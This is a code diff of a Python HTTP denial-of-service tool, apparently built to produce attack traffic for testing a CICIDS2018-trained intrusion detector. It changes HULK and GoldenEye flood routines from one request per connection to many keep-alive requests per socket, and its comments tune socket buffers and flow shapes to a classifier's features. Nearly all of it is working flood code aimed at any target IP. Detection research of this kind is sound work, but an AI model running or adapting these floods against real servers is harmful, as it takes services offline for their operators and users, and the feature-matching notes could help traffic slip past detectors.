@@ -16,13 +16,13 @@ import time
 import random
 import string
 
-# TCP receive buffer sizes → Init Fwd Win Byts feature.
-# Values derived from CICIDS2018 training data medians.
-# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
-_RCVBUF_HULK = 26883       # Training median: 26883 (was 225, didn't match training)
-_RCVBUF_GOLDENEYE = 26883  # Training median: 26883 ✓
-_RCVBUF_SLOWLORIS = 26883  # Training median: 26883 ✓
-_RCVBUF_SLOWHTTPTEST = 26883  # Training median: 26883 ✓
+# TCP receive buffer sizes matching CICIDS2018 training data.
+# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
+# which the model uses for classification (Init Fwd Win Byts feature).
+_RCVBUF_HULK = 225
+_RCVBUF_GOLDENEYE = 26883
+_RCVBUF_SLOWLORIS = 26883
+_RCVBUF_SLOWHTTPTEST = 26883
 
 # ──────────────────────────────────────────────────────────
 # Randomization pools (mimic HULK / GoldenEye header variety)
@@ -89,64 +89,59 @@ class DoSAttack:
             self.request_count += n
 
     # ──────────────────────────────────────────────────────
-    # HULK — Rapid HTTP GET flood, NEW connection per request
-    #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=2.5, median=3
-    #   TotLen Fwd Pkts: mean=172.9, median=289.5
-    #   Fwd Seg Size Min: 32  (TCP with timestamp options)
-    #   Init Fwd Win Byts: median=26883
-    #   Flow Duration:   short (rapid open/close)
-    #   Dst Port: 80
-    #
-    # CRITICAL: The original HULK tool creates a NEW TCP connection
-    # for each HTTP request. Each flow = SYN + ACK + GET (+ FIN)
-    # = ~2-3 forward packets. Using keep-alive with 50-200 requests
-    # creates completely wrong flow profiles that look benign.
+    # HULK — Rapid HTTP GET flood with keep-alive
+    #   Creates flows with HIGH forward packet counts, HIGH
+    #   TotLen Fwd Pkts, LOW Flow IAT, many PSH flags.
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: One HTTP GET request per NEW TCP connection.
-        Rapidly opens connections, sends one request, closes.
-        Each CICFlowMeter flow has ~2-3 fwd packets matching training data."""
+        """HULK DoS: Blast many HTTP GET requests over a single keep-alive TCP connection.
+        By reusing one TCP connection for 50-200 requests, CICFlowMeter sees a single
+        flow with very high forward packet count and bytes — a clear DoS signature."""
         end_time = time.time() + self.duration
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
+                sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK)
                 sock.connect((self.target_ip, self.target_port))
 
-                # Send ONE HTTP GET request per connection (matching training: ~290 bytes fwd)
-                path = "/" + _random_string(8) + _random_url_params(random.randint(2, 6))
-                headers = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {self.target_ip}\r\n"
-                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                    f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                    f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
-                    f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
-                    f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
-                    f"Cache-Control: no-cache\r\n"
-                    f"Connection: close\r\n"
-                    f"\r\n"
-                )
-                sock.sendall(headers.encode())
-                self._inc_count()
+                # Send MANY requests on the SAME connection (keep-alive)
+                requests_per_conn = random.randint(50, 200)
+                for _ in range(requests_per_conn):
+                    if not self.running or time.time() >= end_time:
+                        break
 
-                # Read response briefly then close
-                try:
-                    sock.settimeout(0.3)
-                    sock.recv(4096)
-                except socket.timeout:
-                    pass
+                    path = "/" + _random_string(8) + _random_url_params(random.randint(2, 6))
+                    headers = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {self.target_ip}\r\n"
+                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
+                        f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
+                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
+                        f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
+                        f"Cache-Control: no-cache\r\n"
+                        f"Connection: keep-alive\r\n"
+                        f"\r\n"
+                    )
+                    sock.sendall(headers.encode())
+                    self._inc_count()
+
+                    # Drain any response bytes (non-blocking)
+                    try:
+                        sock.settimeout(0.05)
+                        sock.recv(4096)
+                    except socket.timeout:
+                        pass
+                    sock.settimeout(10)
+
+                    # Very short delay — HULK is meant to be rapid
+                    time.sleep(random.uniform(0.001, 0.01))
 
                 sock.close()
             except Exception:
                 pass
-
-            # Very short delay — HULK is rapid
-            time.sleep(random.uniform(0.001, 0.02))
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -232,76 +227,72 @@ class DoSAttack:
                 pass
 
     # ──────────────────────────────────────────────────────
-    # GOLDENEYE — HTTP GET/POST flood, NEW connection per request
-    #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=3.76, median=4
-    #   TotLen Fwd Pkts: mean=359.6, median=358
-    #   Fwd Seg Size Min: 32
-    #   Init Fwd Win Byts: median=26883
-    #   Flow Duration:   mean=11M µs (~11 sec), median=6.7M µs
-    #   Dst Port: 80
-    #
-    # CRITICAL: The original GoldenEye tool opens a NEW TCP connection
-    # per request. Using keep-alive creates wrong flow profiles.
+    # GOLDENEYE — HTTP GET/POST flood with keep-alive
+    #   Similar to HULK but alternates GET/POST, uses
+    #   Connection: keep-alive aggressively.
     # ──────────────────────────────────────────────────────
     def goldeneye_attack(self):
-        """GoldenEye DoS: One HTTP GET or POST per NEW TCP connection.
-        Each flow has ~4 fwd packets and ~358 bytes, matching training data."""
+        """GoldenEye DoS: GET/POST flood over persistent connections.
+        Sends both GET and POST requests with random bodies, creating flows
+        with high bidirectional traffic and varying packet sizes."""
         end_time = time.time() + self.duration
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
+                sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                 sock.connect((self.target_ip, self.target_port))
 
-                # Send ONE GET or POST request per connection
-                if random.random() < 0.5:
-                    # GET with cache busting
-                    path = "/" + _random_string(6) + _random_url_params(random.randint(3, 8))
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                        f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
-                        f"Cache-Control: no-store, no-cache\r\n"
-                        f"Pragma: no-cache\r\n"
-                        f"Connection: close\r\n"
-                        f"\r\n"
-                    )
-                else:
-                    # POST with random body (moderate size, ~358 bytes total)
-                    body = _random_string(random.randint(64, 256))
-                    path = "/" + _random_string(6) + _random_url_params(2)
-                    req = (
-                        f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Content-Type: application/x-www-form-urlencoded\r\n"
-                        f"Content-Length: {len(body)}\r\n"
-                        f"Connection: close\r\n"
-                        f"\r\n"
-                        f"{body}"
-                    )
-                sock.sendall(req.encode())
-                self._inc_count()
+                requests_per_conn = random.randint(30, 100)
+                for _ in range(requests_per_conn):
+                    if not self.running or time.time() >= end_time:
+                        break
 
-                # Read response briefly then close
-                try:
-                    sock.settimeout(0.3)
-                    sock.recv(4096)
-                except socket.timeout:
-                    pass
+                    if random.random() < 0.5:
+                        # GET with cache busting
+                        path = "/" + _random_string(6) + _random_url_params(random.randint(3, 8))
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: {self.target_ip}\r\n"
+                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                            f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
+                            f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
+                            f"Connection: keep-alive\r\n"
+                            f"Cache-Control: no-store, no-cache\r\n"
+                            f"Pragma: no-cache\r\n"
+                            f"\r\n"
+                        )
+                    else:
+                        # POST with random body (variable size)
+                        body = _random_string(random.randint(64, 512))
+                        path = "/" + _random_string(6) + _random_url_params(2)
+                        req = (
+                            f"POST {path} HTTP/1.1\r\n"
+                            f"Host: {self.target_ip}\r\n"
+                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                            f"Content-Type: application/x-www-form-urlencoded\r\n"
+                            f"Content-Length: {len(body)}\r\n"
+                            f"Connection: keep-alive\r\n"
+                            f"\r\n"
+                            f"{body}"
+                        )
+                    sock.sendall(req.encode())
+                    self._inc_count()
+
+                    # Drain response
+                    try:
+                        sock.settimeout(0.05)
+                        sock.recv(4096)
+                    except socket.timeout:
+                        pass
+                    sock.settimeout(10)
+
+                    time.sleep(random.uniform(0.005, 0.05))
 
                 sock.close()
             except Exception:
                 pass
-
-            # Short delay between connections
-            time.sleep(random.uniform(0.005, 0.05))
 
     # ──────────────────────────────────────────────────────
     # SlowHTTPTest — Slow POST body transmission
